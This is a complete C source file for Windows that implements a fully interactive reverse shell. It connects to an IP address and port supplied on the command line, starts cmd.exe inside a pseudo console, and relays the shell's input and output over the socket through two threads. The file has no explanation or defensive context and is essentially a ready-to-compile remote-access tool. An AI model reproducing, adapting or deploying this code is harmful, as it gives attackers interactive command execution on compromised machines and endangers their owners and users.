#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>

#include <stdint.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

SOCKET create_connection(char* ip, int port)
{
	SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);

	if (sock != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		memset(&addr, 0, sizeof(SOCKADDR_IN));

		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);

		int result = inet_pton(AF_INET, ip, &addr.sin_addr.s_addr);

		if (result == 1)
		{
			if (connect(sock, (const struct sockaddr*)&addr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
				sock = INVALID_SOCKET;
		}
		else
		{
			if (result == 0)
				WSASetLastError(WSA_INVALID_PARAMETER);

			sock = INVALID_SOCKET;
		}
	}

	return sock;
}

BOOL create_pipes(HANDLE* r1, HANDLE* w1, HANDLE* r2, HANDLE* w2)
{
	SECURITY_ATTRIBUTES sa;
	memset(&sa, 0, sizeof(SECURITY_ATTRIBUTES));

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;

	return (CreatePipe(r1, w1, &sa, 10 * 1024 * 1024) && CreatePipe(r2, w2, &sa, 10 * 1024 * 1024));
}

SOCKET g_sock = 0;
HANDLE g_c2sr = NULL; // Read (client -> server)
HANDLE g_c2sw = NULL; // Write (client -> server)
HANDLE g_s2cr = NULL; // Read (server -> client)
HANDLE g_s2cw = NULL; // Write (server -> client)

BOOL thread_transmit_pipe(uint8_t* buffer, int32_t length)
{
	int32_t offset = 0;

	while (offset < length)
	{
		int32_t sent = 0;

		if (!WriteFile(g_s2cw, &buffer[offset], length - offset, &sent, NULL))
			return FALSE;

		offset += sent;
	}

	return TRUE;
}

void __stdcall thread_socket2pipe()
{
	uint8_t buffer[1024];
	int32_t read = 0;

	while ((read = recv(g_sock, &buffer[0], sizeof(buffer), 0)) > 0)
	{
		if (!thread_transmit_pipe(&buffer[0], read))
			break;
	}
}

BOOL thread_transmit_socket(uint8_t* buffer, int32_t length)
{
	int32_t offset = 0;

	while (offset < length)
	{
		int32_t sent = send(g_sock, &buffer[offset], length - offset, 0);

		if (sent == SOCKET_ERROR)
			return FALSE;

		offset += sent;
	}

	return TRUE;
}

void __stdcall thread_pipe2socket()
{
	uint8_t buffer[1024];
	int32_t read = 0;

	while (ReadFile(g_c2sr, &buffer[0], sizeof(buffer), &read, NULL))
	{
		if (!thread_transmit_socket(&buffer[0], read))
			break;
	}
}

int main(int argc, char* argv[])
{
	if (argc != 3)
	{
		printf("Usage: %s <ip> <port>", argv[0]);
		return 1;
	}
	else
	{
		WSADATA wsa_data;
		memset(&wsa_data, 0, sizeof(WSADATA));

		int err = WSAStartup(MAKEWORD(2, 2), &wsa_data);

		if (err != 0)
			printf("Failed to initialize WSA library with error code: %d.\n", err);
		else
		{
			g_sock = create_connection(argv[1], atoi(argv[2]));

			if (g_sock == INVALID_SOCKET)
				printf("Failed to initialize connection with error code: %d.\n", WSAGetLastError());
			else
			{
				if (!create_pipes(&g_s2cr, &g_s2cw, &g_c2sr, &g_c2sw))
					printf("Failed to initialize pipes with error code: %d.\n", GetLastError());
				else
				{
					DWORD mode = 0;

					if (GetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), &mode))
						SetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN);

					char temp[256] = { 0 };
					recv(g_sock, &temp[0], sizeof(temp), 0);

					char* context = NULL;
					char* y = strtok_s(temp, " \n", &context);
					char* x = strtok_s(NULL, " \n", &context);

					COORD coords = { 0 };
					coords.X = atoi(x) & 0xffff;
					coords.Y = atoi(y) & 0xffff;

					HANDLE console = NULL;
					HRESULT err = CreatePseudoConsole(coords, g_s2cr, g_c2sw, 0, &console);

					if (err != S_OK)
						printf("Failed to create pseudo console with error code: %d.\n", err);
					else
					{
						SIZE_T size = 0;
						InitializeProcThreadAttributeList(NULL, 1, 0, &size);

						STARTUPINFOEXA si;
						memset(&si, 0, sizeof(STARTUPINFOEXA));

						si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
						si.lpAttributeList = malloc(size);

						InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
						UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, console, sizeof(HANDLE), NULL, NULL);

						PROCESS_INFORMATION pi;
						memset(&pi, 0, sizeof(PROCESS_INFORMATION));

						char cmd[] = "cmd.exe";

						if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
							printf("Failed to initialize shell program with error code: %d.\n", GetLastError());
						else
						{
							HANDLE hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&thread_socket2pipe, NULL, 0, NULL);
							HANDLE hThread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&thread_pipe2socket, NULL, 0, NULL);

							if (hThread1 != NULL && hThread2 != NULL)
							{
								HANDLE const objects[] = { pi.hProcess, hThread1, hThread2 };

								switch (WaitForMultipleObjects(_countof(objects), &objects[0], FALSE, INFINITE))
								{
								case WAIT_OBJECT_0:
									TerminateThread(hThread1, 0);
									TerminateThread(hThread2, 0);
									break;

								case WAIT_OBJECT_0 + 1:
									TerminateProcess(pi.hProcess, 0);
									TerminateThread(hThread2, 0);
									break;

								case WAIT_OBJECT_0 + 2:
									TerminateProcess(pi.hProcess, 0);
									TerminateThread(hThread1, 0);
									break;

								default:
									break;
								}
							}

							if (hThread1 != NULL)
								CloseHandle(hThread1);

							if (hThread2 != NULL)
								CloseHandle(hThread2);

							CloseHandle(pi.hProcess);
							CloseHandle(pi.hThread);
						}

						free(si.lpAttributeList);
						ClosePseudoConsole(console);
					}
				}

				if (g_s2cr != NULL)
					CloseHandle(g_s2cr);

				if (g_s2cw != NULL)
					CloseHandle(g_s2cw);

				if (g_c2sr != NULL)
					CloseHandle(g_c2sr);

				if (g_c2sw != NULL)
					CloseHandle(g_c2sw);

				shutdown(g_sock, SD_BOTH);
				closesocket(g_sock);
			}

			WSACleanup();
		}

		return 0;
	}
}